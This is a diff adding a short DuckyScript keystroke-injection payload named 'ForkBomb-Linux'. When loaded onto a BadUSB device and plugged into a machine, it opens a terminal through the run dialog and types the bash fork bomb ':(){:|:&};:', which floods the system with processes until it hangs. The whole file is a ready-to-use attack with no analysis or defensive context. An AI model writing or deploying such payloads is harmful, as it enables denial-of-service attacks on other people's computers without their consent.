@@ -1,0 +1,9 @@
+REM ForkBomb-Linux
+REM By 7h30th3r0n3
+GUI r
+DELAY 300
+STRING terminal
+ENTER 
+DELAY 300
+STRING :(){:|:&};:
+ENTER
